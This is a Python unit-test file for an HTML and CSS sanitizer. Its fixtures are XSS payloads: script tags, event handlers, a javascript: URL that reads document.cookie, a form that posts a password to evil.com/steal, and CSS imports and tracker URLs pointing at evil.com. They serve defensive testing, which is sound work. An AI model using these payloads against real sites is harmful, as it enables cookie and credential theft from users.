"""
Unit tests for HTML & CSS security sanitizer (Codename: Kestrel)
Verifies adversarial XSS payloads and CSP enforcement per IMPLEMENTATION_SPEC.md §9.
"""


from backend.app.security.sanitizer import (
    CSP_PREVIEW_POLICY,
    build_sandboxed_preview_html,
    sanitize_css,
    sanitize_html,
)


def test_csp_policy_contains_required_directives():
    assert "default-src 'none'" in CSP_PREVIEW_POLICY
    assert "script-src 'none'" in CSP_PREVIEW_POLICY
    assert "connect-src 'none'" in CSP_PREVIEW_POLICY
    assert "frame-src 'none'" in CSP_PREVIEW_POLICY
    assert "form-action 'none'" in CSP_PREVIEW_POLICY


def test_sanitize_html_strips_active_script_tags():
    raw = '<p>Normal text</p><script>alert("XSS")</script><b>Bold</b>'
    cleaned = sanitize_html(raw)
    assert "<script>" not in cleaned
    assert 'alert("XSS")' not in cleaned
    assert "<p>Normal text</p>" in cleaned
    assert "<b>Bold</b>" in cleaned


def test_sanitize_html_strips_inline_event_handlers():
    raw = '<img src="valid.png" onerror="alert(1)" onload="evil()" onclick="steal()">'
    cleaned = sanitize_html(raw)
    assert "onerror" not in cleaned
    assert "onload" not in cleaned
    assert "onclick" not in cleaned
    assert 'src="valid.png"' in cleaned


def test_sanitize_html_strips_javascript_urls():
    raw = '<a href="javascript:alert(document.cookie)">Click here</a>'
    cleaned = sanitize_html(raw)
    assert "javascript:" not in cleaned
    assert 'href=""' in cleaned or 'href' not in cleaned or "javascript" not in cleaned


def test_sanitize_html_strips_forms_and_inputs():
    raw = '<form action="https://evil.com/steal" method="POST"><input type="password" name="pw"><button type="submit">Send</button></form>'
    cleaned = sanitize_html(raw)
    assert "<form" not in cleaned
    assert "<input" not in cleaned
    assert "<button" not in cleaned


def test_sanitize_html_strips_iframes_and_objects():
    raw = '<iframe src="https://evil.com"></iframe><object data="evil.swf"></object><embed src="evil.swf">'
    cleaned = sanitize_html(raw)
    assert "<iframe" not in cleaned
    assert "<object" not in cleaned
    assert "<embed" not in cleaned


def test_sanitize_html_strips_meta_refresh_and_base():
    raw = '<meta http-equiv="refresh" content="0;url=http://evil.com"><base href="https://evil.com">'
    cleaned = sanitize_html(raw)
    assert "<meta" not in cleaned
    assert "<base" not in cleaned


def test_sanitize_html_enforces_noopener_noreferrer_on_links():
    raw = '<a href="https://example.com" target="_blank">External Link</a>'
    cleaned = sanitize_html(raw)
    assert 'rel="noopener noreferrer"' in cleaned
    assert 'href="https://example.com"' in cleaned


def test_sanitize_css_strips_imports_and_external_urls():
    raw_css = """
    @import url("https://evil.com/exfil.css");
    body {
        background: url('https://evil.com/tracker.png');
        color: #333;
        width: expression(alert(1));
    }
    """
    cleaned = sanitize_css(raw_css)
    assert "@import" not in cleaned
    assert "https://evil.com" not in cleaned
    assert "expression" not in cleaned
    assert "color: #333;" in cleaned


def test_build_sandboxed_preview_html_injects_csp_meta():
    raw_document = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Test Experiment Brief</title>
        <style>
            h1 { color: #008080; }
            @import url("http://evil.com/style.css");
        </style>
    </head>
    <body>
        <h1>Grounded Experiment</h1>
        <p>Testing activation metrics.</p>
        <script>evilCode()</script>
    </body>
    </html>
    """
    preview = build_sandboxed_preview_html(raw_document, title="Experiment Document")
    assert '<meta http-equiv="Content-Security-Policy"' in preview
    assert CSP_PREVIEW_POLICY in preview
    assert "<h1>Grounded Experiment</h1>" in preview
    assert "<script>" not in preview
    assert "evilCode" not in preview
    assert "@import" not in preview
    assert "h1 { color: #008080; }" in preview


def test_sanitize_html_empty_or_none():
    assert sanitize_html("") == ""
    assert sanitize_css("") == ""
    preview = build_sandboxed_preview_html("")
    assert '<meta http-equiv="Content-Security-Policy"' in preview
